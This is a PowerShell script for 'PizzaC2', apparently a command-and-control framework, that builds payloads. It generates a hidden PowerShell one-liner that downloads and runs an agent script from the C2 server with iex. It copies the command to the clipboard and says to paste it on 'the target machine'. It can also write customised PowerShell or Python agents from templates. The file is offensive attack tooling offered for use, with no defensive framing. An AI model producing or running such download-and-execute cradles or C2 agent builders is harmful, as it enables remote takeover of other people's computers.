<#
.SYNOPSIS
    PizzaC2 - Payload Builder CLI
    Generates customized PowerShell / Python agents and one-liners
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$RoomCode,

    [string]$ServerUrl = "http://127.0.0.1:8080",
    [string]$Type = "oneliner", # oneliner, ps1, py
    [string]$OutputFile = ""
)

Write-Host @"
===================================================================
  ____  _                 ____ ____       ____        _ _     _           
 |  _ \(_)___________ _  / ___|___ \     | __ ) _   _(_) | __| | ___ _ __ 
 | |_) | |_  /_  / _` | | |     __) |    |  _ \| | | | | |/ _` |/ _ \ '__|
 |  __/| |/ / / / (_| | | |___ / __/     | |_) | |_| | | | (_| |  __/ |   
 |_|   |_/___/___\__,_|  \____|_____|    |____/ \__,_|_|_|\__,_|\___|_|   
===================================================================
[*] Target Room Code: $RoomCode
[*] C2 Server URL:    $ServerUrl
===================================================================
"@ -ForegroundColor Yellow

$CurrentDir = $PSScriptRoot
if (-not $CurrentDir) { $CurrentDir = Get-Location }

switch ($Type.ToLower()) {
    "oneliner" {
        $oneLiner = "powershell -w hidden -nop -c `"iex(New-Object Net.WebClient).DownloadString('$ServerUrl/api/agent/ps1?code=$RoomCode&server=$ServerUrl')`""
        Write-Host "[+] Generated Windows PowerShell 1-Liner Payload:" -ForegroundColor Green
        Write-Host ""
        Write-Host $oneLiner -ForegroundColor Cyan
        Write-Host ""
        Write-Host "[*] Copy and paste this directly into cmd.exe or PowerShell on the target machine!" -ForegroundColor Yellow
        try { Set-Clipboard -Value $oneLiner; Write-Host "[*] (Copied to your clipboard!)" -ForegroundColor Green } catch {}
    }

    "ps1" {
        $templatePath = Join-Path $CurrentDir "agent.ps1"
        if (-not (Test-Path $templatePath)) {
            Write-Host "[-] agent.ps1 template not found." -ForegroundColor Red
            exit 1
        }
        $content = [System.IO.File]::ReadAllText($templatePath)
        $content = $content -replace '(\$ServerUrl\s*=\s*")[^"]*(")', "`$1$ServerUrl`$2"
        $content = $content -replace '(\$RoomCode\s*=\s*")[^"]*(")', "`$1$RoomCode`$2"

        $out = if ($OutputFile) { $OutputFile } else { "agent_$RoomCode.ps1" }
        [System.IO.File]::WriteAllText($out, $content)
        Write-Host "[+] Saved customized PowerShell agent to: $out" -ForegroundColor Green
    }

    "py" {
        $templatePath = Join-Path $CurrentDir "agent.py"
        if (-not (Test-Path $templatePath)) {
            Write-Host "[-] agent.py template not found." -ForegroundColor Red
            exit 1
        }
        $content = [System.IO.File]::ReadAllText($templatePath)
        $content = $content -replace '(SERVER_URL\s*=\s*")[^"]*(")', "`$1$ServerUrl`$2"
        $content = $content -replace '(ROOM_CODE\s*=\s*")[^"]*(")', "`$1$RoomCode`$2"

        $out = if ($OutputFile) { $OutputFile } else { "agent_$RoomCode.py" }
        [System.IO.File]::WriteAllText($out, $content)
        Write-Host "[+] Saved customized Python agent to: $out" -ForegroundColor Green
    }

    default {
        Write-Host "[-] Invalid type. Choose 'oneliner', 'ps1', or 'py'." -ForegroundColor Red
    }
}
